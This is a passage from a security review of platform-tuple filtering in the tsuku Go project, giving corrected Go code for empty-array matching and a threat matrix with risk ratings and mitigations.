    if w.Arch != "" && w.Arch != arch {
        return false
    }

    return true
}
```

**Corrected:**
```go
func (w *WhenClause) Matches(os, arch string) bool {
    if w.IsEmpty() {
        return true
    }

    // Check platform tuples (new behavior)
    if w.Platform != nil {  // ✅ FIXED: check nil, not length
        if len(w.Platform) == 0 {
            return false  // ✅ Empty array = match nothing
        }
        tuple := fmt.Sprintf("%s/%s", os, arch)
        for _, p := range w.Platform {
            if p == tuple {
                return true
            }
        }
        return false
    }

    // Legacy OS/Arch behavior (deprecated)
    if w.OS != "" && w.OS != os {
        return false
    }
    if w.Arch != "" && w.Arch != arch {
        return false
    }

    return true
}
```

**Security impact:** Prevents unintended execution of steps with empty platform arrays.

### A.2 IsEmpty() Logic

**Current (from design):**
```go
func (w *WhenClause) IsEmpty() bool {
    return w == nil ||
        (len(w.Platform) == 0 && w.OS == "" && w.Arch == "" && w.PackageManager == "")
}
```

**Issue:** This treats `Platform: []` (empty array) as "empty clause", which contradicts design semantics.

**Corrected:**
```go
func (w *WhenClause) IsEmpty() bool {
    return w == nil ||
        (w.Platform == nil && w.OS == "" && w.Arch == "" && w.PackageManager == "")
}
```

**Semantics:**
- `nil` clause: Empty, matches all platforms
- `{Platform: nil}`: Empty, matches all platforms (no filter)
- `{Platform: []}`: **Not empty**, matches no platforms (explicit filter)
- `{OS: "linux"}`: Not empty, matches Linux (any arch)

---

## Appendix B: Threat Matrix

| Threat Category | Specific Threat | Likelihood | Impact | Risk | Mitigation | Residual |
|----------------|----------------|------------|--------|------|------------|----------|
| **Parsing** | TOML parser exploit | Very Low | Critical | Low | Mature library, type safety | Very Low |
| **Parsing** | Type confusion in UnmarshalTOML | Low | Medium | Low | Structured type, Go runtime | Very Low |
| **Logic** | Matches() off-by-one error | Low | High | Medium | Comprehensive tests | Low |
| **Logic** | Empty array handling bug | Medium | Medium | Medium | Fix before implementation | None |
| **Logic** | Mutual exclusivity not enforced | Low | Low | Low | Validation at load time | Very Low |
| **Validation** | Invalid platform tuple bypass | Very Low | Medium | Low | Validate against known set | Very Low |
| **Validation** | Missing platform coverage | Medium | Medium | Medium | Recipe review, tests | Medium |
| **DoS** | Large platform array | Low | Low | Low | Bounded by file size | Very Low |
| **Supply Chain** | Malicious recipe platform filtering | Medium | High | Medium | Recipe trust boundary | Medium |
| **Execution** | Skip security step via filtering | Low | High | Medium | Validation, tests | Low |

**Overall Risk: LOW** (most threats are low likelihood or have strong mitigations)

---

## Appendix C: References

1. **Design document:** `/home/dgazineu/dev/workspace/tsuku/tsuku-2/public/tsuku/docs/DESIGN-when-clause-platform-tuples.md`
2. **Platform validation:** `/home/dgazineu/dev/workspace/tsuku/tsuku-2/public/tsuku/internal/recipe/platform.go`
3. **Plan generator:** `/home/dgazineu/dev/workspace/tsuku/tsuku-2/public/tsuku/internal/executor/plan_generator.go`
4. **SSRF protection:** `/home/dgazineu/dev/workspace/tsuku/tsuku-2/public/tsuku/internal/httputil/ssrf.go`
5. **Download action:** `/home/dgazineu/dev/workspace/tsuku/tsuku-2/public/tsuku/internal/actions/download.go`

---

**Analysis conducted:** 2025-12-27
**Reviewer:** Security analysis for platform tuple support feature
**Status:** Complete - proceed with implementation after addressing critical findings
